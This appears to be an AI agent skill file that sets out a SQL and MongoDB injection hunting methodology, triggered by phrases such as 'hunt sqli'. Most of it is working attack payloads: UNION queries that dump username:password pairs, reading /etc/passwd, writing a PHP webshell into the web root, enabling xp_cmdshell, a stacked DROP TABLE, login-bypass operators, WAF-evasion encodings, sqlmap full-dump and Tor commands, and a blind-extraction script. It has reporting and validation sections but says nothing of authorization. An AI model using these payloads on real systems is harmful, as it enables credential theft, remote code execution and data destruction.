---
name: hunt-sqli
description: |
  SQL Injection and NoSQL Injection hunting methodology. Classic, blind, time-based,
  error-based SQLi. MongoDB NoSQLi. Detection, exploitation, WAF bypass, and
  data exfiltration techniques.
triggers:
  - hunt sqli
  - test for sql injection
  - sql injection
  - nosql injection
  - blind sqli
  - database testing
  - sqli payloads
category: security
---

# SQL Injection & NoSQL Injection Hunting

## 1. Detection Methodology

### Universal Probes

Send these probes to every parameter (GET, POST, JSON, headers, cookies):

| Probe | Purpose |
|-------|---------|
| `'` | Single quote — classic string delimiter test |
| `"` | Double quote — for some DBs/ORMs |
| `\` | Backslash — escape testing |
| `1' OR '1'='1` | Basic tautology |
| `1' AND '1'='2` | Boolean contrast |
| `1'-- -` | MySQL comment out rest |
| `1'--` | Standard SQL comment |
| `1'#` | MySQL comment |
| `1'/*` | Multi-line comment |
| `1'+UNION+SELECT+1-- -` | UNION probe |
| `1' WAITFOR DELAY '0:0:5'--` | MSSQL time-based |
| `1' AND SLEEP(5)-- -` | MySQL time-based |
| `1' AND 1=pg_sleep(5)-- -` | PostgreSQL time-based |
| `1' AND dbms_pipe.receive_message(('a'),5)--` | Oracle time-based |

### Context Identification

Determine where your input lands by analyzing error messages, responses, and behavior:

**String context** — input wrapped in quotes:
```
SELECT * FROM users WHERE username = 'INPUT'
```
Probes: `'` causes syntax error or escape behavior.

**Numeric context** — input used without quotes:
```
SELECT * FROM products WHERE id = INPUT
```
Probes: `1` vs `1 AND 1=1` — no quote needed. Try `1` then `0` then `1 AND 1=1`.

**JSON context** — input inside JSON payload:
```
{"username": "INPUT", "password": "test"}
```
Probes: JSON escapes, MongoDB operators (`$ne`, `$gt`, `$regex`).

**Header context** — User-Agent, X-Forwarded-For, Referer, Cookie:
```
INSERT INTO logs VALUES ('127.0.0.1', 'INPUT')
```
Probes: same as string context but via header.

### Behavior Clues by Response

| Response change | Likely context |
|----------------|---------------|
| 500 on `'` | String context, unescaped |
| Same on `'` and `''` | String context, escaped |
| 200 on `1`, 500 on `1'` | Numeric context |
| Diff on `1=1` vs `1=2` | Blind boolean injectable |
| Delay on `SLEEP(5)` | Time-based injectable |
| Error with table/column names | Error-based injection |
| JSON keys change based on payload | NoSQL injection |

---

## 2. Injection Type Identification

### Error-Based SQLi

Trigger database error messages that reveal info:

```
'  (basic syntax error)
1'  (syntax error with number)
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -  (MySQL XPath error)
1' AND 1=CAST((SELECT @@version) AS INT)-- -  (MSSQL type error)
1' AND 1=CAST((SELECT version()) AS INTEGER)-- -  (PostgreSQL type error)
1' AND ctxsys.drithsx.sn(1,(SELECT banner FROM v$version))--  (Oracle)
```

**Confirmed if:** error message includes database version, user, or table names.

### UNION-Based SQLi

Requires matching column count and compatible data types:

```
1' UNION SELECT 1-- -           # test 1 column
1' UNION SELECT 1,2-- -         # test 2 columns
1' UNION SELECT 1,2,3-- -       # test 3 columns
```

**Confirmed if:** injected numbers appear in the response body.

### Blind Boolean SQLi

No visible data, but response differs between true/false conditions:

```
1' AND 1=1-- -   → normal response (true)
1' AND 1=2-- -   → different response (false, empty, or error)
```

**Confirmed if:** consistent response difference between true/false conditions across multiple probes.

### Blind Time-Based SQLi

No visible or boolean difference — use time delays:

```
1' AND SLEEP(5)-- -           → waits ~5s (MySQL)
1' AND 1=pg_sleep(5)-- -     → waits ~5s (PostgreSQL)
1' WAITFOR DELAY '0:0:5'--   → waits ~5s (MSSQL)
1' AND dbms_pipe.receive_message(('a'),5)-- → waits ~5s (Oracle)
```

**Confirmed if:** consistent delay on true condition, no delay on false, measured with controlled timing (±1s tolerance).

---

## 3. Step-by-Step Exploitation per Database

### MySQL

**Fingerprint:**
```
1' AND @@version LIKE '5.%'-- -
1' AND @@version LIKE '8.%'-- -
1' AND CONNECTION_ID()>0-- -
```

**Version:**
```
1' UNION SELECT @@version,2-- -
' UNION SELECT @@version-- -
```

**Database names:**
```
1' UNION SELECT SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

**Table names:**
```
1' UNION SELECT TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='db_name'-- -
```

**Column names:**
```
1' UNION SELECT COLUMN_NAME,2 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
```

**Dump data:**
```
1' UNION SELECT CONCAT(username,':',password),2 FROM users-- -
1' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x3c62723e),2 FROM users-- -
```

**File read:**
```
1' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
```

**OS access (requires FILE priv):**
```
1' UNION SELECT '<?php system($_GET["cmd"]);?>',2 INTO OUTFILE '/var/www/shell.php'-- -
```

### PostgreSQL

**Fingerprint:**
```
1' AND current_setting('server_version') LIKE '1%'-- -
1' AND current_setting('server_version') LIKE '2%'-- -
```

**Version:**
```
1' UNION SELECT version(),2-- -
```

**Database names:**
```
1' UNION SELECT datname,2 FROM pg_database-- -
```

**Table names:**
```
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='public'-- -
```

**Column names:**
```
1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
```

**Dump data:**
```
1' UNION SELECT username||':'||password,2 FROM users-- -
```

**Stacked queries:**
```
1'; DROP TABLE users-- -
1'; CREATE TABLE log(data text)-- -
```

### MSSQL

**Fingerprint:**
```
1' AND @@VERSION LIKE '%2019%'-- -
1' AND (SELECT DB_NAME())>0-- -
```

**Version:**
```
1' UNION SELECT @@VERSION,2-- -
```

**Database names:**
```
1' UNION SELECT name,2 FROM master..sysdatabases-- -
```

**Table names:**
```
1' UNION SELECT name,2 FROM sysobjects WHERE xtype='U'-- -
```

**Column names:**
```
1' UNION SELECT name,2 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
```

**Dump data:**
```
1' UNION SELECT username+':'+password,2 FROM users-- -
```

**Stacked queries:**
```
1'; EXEC xp_cmdshell 'whoami'-- -
1'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -
```

**Time-based:**
```
1' WAITFOR DELAY '0:0:5'-- -
1'; WAITFOR DELAY '0:0:5'-- -
```

### Oracle

**Fingerprint:**
```
1' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'-- -
```

**Version:**
```
1' UNION SELECT banner,2 FROM v$version-- -
1' UNION SELECT version,2 FROM v$instance-- -
```

**Dual table note:** Oracle requires `FROM dual` for SELECT without a real table:
```
1' UNION SELECT 'a','b' FROM dual-- -
```

**Database names:**
```
1' UNION SELECT owner,2 FROM all_tables-- -
```

**Table names:**
```
1' UNION SELECT table_name,2 FROM all_tables WHERE owner='SYSTEM'-- -
```

**Column names:**
```
1' UNION SELECT column_name,2 FROM all_tab_columns WHERE table_name='USERS'-- -
```

**Dump data:**
```
1' UNION SELECT username||':'||password,2 FROM users-- -
```

**Time-based:**
```
1' AND dbms_pipe.receive_message(('a'),5)=1-- -
1' AND (SELECT COUNT(*) FROM all_objects WHERE dbms_pipe.receive_message(('a'),5)=1)=1-- -
```

---

## 4. UNION-Based Extraction with Column Counting

### Column Count via ORDER BY

```
1' ORDER BY 1-- -    # no error → at least 1 column
1' ORDER BY 2-- -    # no error → at least 2
1' ORDER BY N-- -    # error → N-1 columns
```

### Column Count via NULL UNION

```
1' UNION SELECT NULL-- -
1' UNION SELECT NULL,NULL-- -
1' UNION SELECT NULL,NULL,NULL-- -
```

Use `NULL` to avoid type mismatches when identifying column count.

### Determining Output Columns

Once column count is known (e.g., 3 columns):

```
1' UNION SELECT 1,2,3-- -
```

Check response body for which numbers appear. Those positions are usable for data extraction.

### Type-Friendly Column Detection

If certain columns expect specific types (int, string), try:

```
1' UNION SELECT 'a','b','c'-- -
1' UNION SELECT 1,'a',NULL-- -
```

If `NULL` works but `'a'` fails at position N, that column expects integer.

### Full UNION extraction pattern

```
# Step 1: Find column count
1' ORDER BY 5-- -   → error → 4 columns

# Step 2: Find output positions
1' UNION SELECT 1,2,3,4-- -

# Step 3: Replace position 2 (visible) with data
1' UNION SELECT 1,@@version,3,4-- -

# Step 4: Extract in bulk
1' UNION SELECT 1,GROUP_CONCAT(table_name,0x3a),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

---

## 5. Time-Based Blind Techniques per Database

### MySQL — SLEEP()

```
1' AND SLEEP(5)-- -
1' AND BENCHMARK(10000000,MD5('a'))-- -    # alternate heavy computation
1' AND IF((SELECT SUBSTRING(version(),1,1))='5',SLEEP(5),0)-- -
```

**Extraction pattern (1 char at a time):**
```
1' AND IF((SELECT MID(version(),{N},1))='{C}',SLEEP(3),0)-- -
```
Test each character position `{N}` and value `{C}`.

### PostgreSQL — pg_sleep()

```
1' AND 1=pg_sleep(5)-- -
1' AND (SELECT pg_sleep(5))-- -
```

**Extraction pattern:**
```
1' AND (SELECT CASE WHEN (SELECT SUBSTRING(version(),{N},1))='{C}' THEN pg_sleep(3) ELSE 0 END)-- -
```

### MSSQL — WAITFOR DELAY

```
1' WAITFOR DELAY '0:0:5'-- -
1';WAITFOR DELAY '0:0:5'-- -
```

**Extraction pattern:**
```
1' IF (SELECT SUBSTRING(@@version,{N},1))='{C}' WAITFOR DELAY '0:0:3'-- -
```

### Oracle — dbms_pipe.receive_message()

```
1' AND dbms_pipe.receive_message(('a'),5)=1-- -
```

**Extraction pattern:**
```
1' AND (SELECT CASE SUBSTR(version,{N},1) WHEN '{C}' THEN dbms_pipe.receive_message(('a'),3) ELSE NULL END FROM v$version WHERE rownum=1) IS NOT NULL-- -
```

### General Time-Based Binary Search

Instead of brute-forcing char-by-char, use binary search for faster extraction:

```
# Is first character >= 'm'?
1' AND IF(ASCII(SUBSTRING(version(),{N},1)) >= 109, SLEEP(3), 0)-- -
# Is first character >= 't'? (if yes above)
1' AND IF(ASCII(SUBSTRING(version(),{N},1)) >= 116, SLEEP(3), 0)-- -
# Is first character >= 'p'? (if no above)
1' AND IF(ASCII(SUBSTRING(version(),{N},1)) >= 112, SLEEP(3), 0)-- -
```

---

## 6. NoSQL Injection for MongoDB

### JSON Operator Injection

When the backend parses JSON input directly, inject MongoDB operators:

| Payload | Effect |
|---------|--------|
| `{"username": {"$ne": ""}, "password": {"$ne": ""}}` | Match any user, any password |
| `{"username": "admin", "password": {"$ne": ""}}` | Log in as admin without knowing password |
| `{"username": {"$regex": ".*"}, "password": {"$gt": ""}}` | Regex match all users |
| `{"$where": "this.password.length > 0"}` | Match based on JS expression |
| `{"username": "admin", "$where": "1==1"}` | Boolean true via JS expression |

### URL Parameter NoSQL Injection

When query params map to MongoDB queries:

```
?username=admin&password[$ne]=          → password != ""
?username[$ne]=&password[$ne]=          → any user, any password
?username[$regex]=^a&password[$ne]=     → users starting with 'a'
?username[$gt]=&password[$gt]=          → greater-than match
?username[$nin][]=admin&password[$ne]=  → exclude admin user
```

### NoSQL Boolean-Based Extraction

Extract data character by character using `$regex`:

```
?username[$regex]=^a&password[$ne]=     → true if user starts with 'a'
?username[$regex]=^ad&password[$ne]=    → true if user starts with 'ad'
?username[$regex]=^adm&password[$ne]=   → true if user starts with 'adm'
```

### NoSQL $where Injection

```
?$where=1                                 # Error or true
?$where=0                                 # False or different
?$where=this.password.match(/^a/)         # Test password start
?$where=this.password.length>5            # Test password length
```

### NoSQL In-Band Extraction

```
# Blind extraction via timing
?username[$where]=sleep(5000)             # JavaScript timeout
?username=1&password=1&$where=sleep(5000) 
```

### NoSQL Time-Based

```
?username=admin'&&this.password[0]=='a'&&'1
?username=admin'&&sleep(5000)&&'1
```

### Defeating $regex Limitations

```
# MongoDB $regex is case-sensitive by default
?username[$regex]=^A&password[$ne]=       # won't match 'admin'
?username[$options]=i&username[$regex]=^a # case-insensitive
```

---

## 7. WAF Bypass Techniques

### Encoding Bypass

| Technique | Example |
|-----------|---------|
| URL encoding | `%27%20OR%201%3D1--` |
| Double URL encoding | `%2539%2520OR%25201%253D1--` |
| Unicode encoding | `%C0%A7` for `'` (IIS) |
| Hex encoding | `0x27+OR+0x31%3D0x31` |
| HTML entities (in POST) | `&#39;+OR+1=1--` |

### Comment Insertion

```
1'/**/OR/**/1=1-- -
1'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3-- -
1'/*!UNION*/ /*!SELECT*/ 1,2,3-- -
UN/**/ION SEL/**/ECT 1,2,3
```

### Case Variation

```
1' UnIoN SeLeCt 1,2,3-- -
1' uNIoN sELecT 1,2,3-- -
```

### Operator Substitution

| Original | Bypass |
|----------|--------|
| `OR 1=1` | `|| 1=1` |
| `AND 1=1` | `&& 1=1` |
| `=` | `LIKE`, `IN`, `BETWEEN`, `!=` |
| `SPACE` | `%09`, `%0A`, `%0C`, `%0D`, `+` |
| `UNION` | `UNION ALL` |
| `SELECT` | `SELECT/*!*/` |
| `SLEEP(5)` | `SLEEP(5) OR SLEEP(6)` |

### Null Bytes and Truncation

```
1'%00+OR+1=1-- -
1'/**/OR/**/1=1-- -%00
```

### HTTP Parameter Pollution (HPP)

```
?user=1'&user=admin&pass=1'&pass=test
?page=1&page=1' UNION SELECT 1,2,3-- -
```

### HTTP Method Variation

```
GET  → POST
POST → PUT, DELETE, PATCH
```

### Application-Specific Tricks

**ModSecurity:** `1' /*!50000OR*/ 1=1-- -`
**Cloudflare:** `1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -`
**AWS WAF:** Use case variation `SeLeCt` with `/**/`

---

## 8. Automated Extraction Methodology

### sqlmap — Essential Flags

```bash
# Basic scan with risk
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5

# Check all params (POST, headers)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --level=5

# Header-only check
sqlmap -u "http://target.com/" --headers="User-Agent: mozilla'" --level=3

# Fetch database banner
sqlmap -u "http://target.com/page?id=1" --banner

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Full automatic dump
sqlmap -u "http://target.com/page?id=1" --dump-all

# WAF detection
sqlmap -u "http://target.com/page?id=1" --identify-waf

# Tors proxy
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=socks5 --check-tor

# Custom tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper="between,randomcase,space2comment"

# Time-based with high confidence
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=10

# Request from file
sqlmap -r request.txt --level=5 --risk=3

# Batch mode (no prompts)
sqlmap -u "http://target.com/page?id=1" --batch --dump

# Specific DB fingerprint
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

### sqlmap Common Tamper Scripts

| Tamper | Purpose |
|--------|---------|
| `space2comment` | Replace spaces with comments |
| `between` | Replace `>` with `NOT BETWEEN`, `=` with `BETWEEN` |
| `randomcase` | Random case for keywords |
| `apostrophemask` | Replace `'` with UTF-8 |
| `bluecoat` | Substitute `%09` for space after `SELECT` |
| `halfversionedmorekeywords` | Add versioned MySQL comment |
| `modsecurityversioned` | Versioned comment for ModSecurity |
| `percentage` | Add `%` before each char |
| `unionalltounion` | Replace `UNION ALL` with `UNION` |
| `charencode` | URL encode all chars |

### Report Template

```
**Vulnerability:** SQL Injection
**Parameter:** id (GET)
**Payload:** 1' UNION SELECT @@version,user(),database(),4-- -
**Database:** MySQL 8.0.x — User: root@localhost
**Injection type:** UNION-based — Impact: Full data extraction
**Steps:** (1) Send `?...id=1' UNION SELECT @@version,2,3,4-- -`
(2) Observe version string at position 2 (3) Extend to data extraction
**Proof:** [screenshot or response excerpt]
```

### Custom Blind Extraction Script

```python
import requests
url = "http://target.com/vuln.php"
true_condition = "normal response keyword"

def test_char(pos, char):
    payload = f"1' AND MID(version(),{pos},1)='{char}'-- -"
    r = requests.get(url, params={"id": payload})
    return true_condition in r.text

extracted = ""
for pos in range(1, 33):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789._-":
        if test_char(pos, c):
            extracted += c; break
print(extracted)
```

---

## 9. Tools References

### SQL Injection Tools

| Tool | Use Case |
|------|----------|
| **sqlmap** | Full automation for all SQLi types |
| **jSQL Injection** | GUI-based SQLi tool |
| **NoSQLMap** | NoSQL injection automation |
| **Burp Suite** | Proxy + scanner + manual testing |
| **BBQSQL** | Blind SQLi framework |

### Payload Resources

- **PayloadsAllTheThings:** `github.com/swisskyrepo/PayloadsAllTheThings`
- **PortSwigger Cheat Sheet:** `portswigger.net/web-security/sql-injection/cheat-sheet`
- **SQL Injection Wiki:** `sqlwiki.netspi.com`

### sqlmap Common Flags Quick Reference

```
--url=URL            Target URL
--data=DATA          POST data
--cookie=COOKIE      HTTP Cookie
--headers=HEADERS    Extra headers
--auth-type=AUTH     Auth type (Basic, Digest, NTLM)
--auth-cred=CRED     Auth credentials (user:pass)
--level=LEVEL        Test level (1-5, default 1)
--risk=RISK          Risk level (1-3, default 1)
--dbms=DBMS          Force database type
--technique=TECH     SQLi techniques to use (BEUSTQ)
--tamper=TAMPER      Tamper script(s)
--batch              Never ask for user input
--dump-all           Dump everything
--flush-session      Flush session files
--fresh-queries      Ignore query results from session
--no-cast            Turn off payload casting
--time-sec=SEC       Seconds of delay for time-based
--union-cols=COLS    Range of columns for UNION
--threads=THREADS    Max threads
--random-agent       Random User-Agent
--tls                 Force TLS
--headers="X-Forwarded-For: 127.0.0.1"
```

---

## 10. Validation — Confirmed SQLi vs False Positive

### Confirmed SQLi Criteria

A finding is **confirmed** when **at least two** of the following are demonstrated:

1. **Response difference:** Clear, repeatable difference between true and false conditions (boolean).
2. **Time delay:** Consistent, measured delay matching the injected sleep value, with a zero-delay baseline for false conditions (time-based).
3. **Data reflection:** Injected values (e.g., UNION SELECT numbers) appear verbatim in the response (UNION/error-based).
4. **Error leak:** Database error message containing database version, table names, or SQL syntax from your input.
5. **Data extraction:** Successfully extracted at least one real database value (version string, table name, row count).

### False Positive Scenarios

| False pattern | Why it's not SQLi |
|---------------|-------------------|
| Same error on `'` and `''` | Likely just input validation error, not SQL |
| Delay on every request including baseline | Network latency, not time-based injection |
| Delay only once then never again | Database/connection caching, not injection |
| `1 AND 1=1` different from `1 AND 1=2` but no other probes work | Could be application logic, not injection |
| Error message that just says "syntax error" without DB info | Generic application error, need more evidence |
| Single `'` crashes but `' OR '1'='1` doesn't change behavior | App has try/except but no injection path |
| Response changes only on specific values | Application feature, not injection |
| sqlmap reports "time-based" but manual testing shows no delay | Network artifacts — always verify manually |

### Reproduction Checklist

Before reporting:

- [ ] Reproduce with a **new, clean session** (no cookies that might have been set)
- [ ] Test the payload at least **3 times** to confirm consistency
- [ ] For time-based: verify with `SLEEP(2)`, `SLEEP(5)`, `SLEEP(10)` — ensure proportional timing
- [ ] For boolean: verify **both** true and false conditions produce distinct responses
- [ ] For UNION: verify the extracted data is real (not mirrored from input)
- [ ] Test with a **different payload variation** that achieves the same effect
- [ ] Ensure the vulnerable parameter is clearly identified
- [ ] Document the **HTTP request** (method, path, headers, body) that triggers the vulnerability
- [ ] If sqlmap confirms, also have a **manual proof** (at minimum: a timing difference or boolean difference)

### Severity Estimation

| Severity | Criteria |
|----------|----------|
| **Critical** | `UNION` or `error-based` on a high-privilege user (DBA, sa, root) with data extraction proven |
| **High** | `UNION` or error-based SQLi on any user, or blind boolean on privileged user |
| **Medium** | Blind boolean or time-based on low-privilege user with slow extraction |
| **Low** | Out-of-band only (DNS, HTTP), or injection detected but no data path identified |

---

## Quick Reference: Database Fingerprinting Payloads

| Database | Distinctive behavior |
|----------|---------------------|
| **MySQL** | `SLEEP(5)` works, `-- -` comment, `#` comment, `@@version` returns `5.x`/`8.x` |
| **PostgreSQL** | `pg_sleep(5)` works, `--` comment, `version()` returns PostgreSQL string |
| **MSSQL** | `WAITFOR DELAY '0:0:5'` works, `@@VERSION`, `;` batch separator works |
| **Oracle** | `FROM dual` required, `dbms_pipe.receive_message` works, no `--` comment (use `-- `) |
| **SQLite** | No native sleep, `randomblob(100000000)` for CPU timing, `sqlite_version()` |
| **MongoDB/NoSQL** | JSON accepts `$ne`, `$regex`, `$where`; `[$ne]=` in URL params |
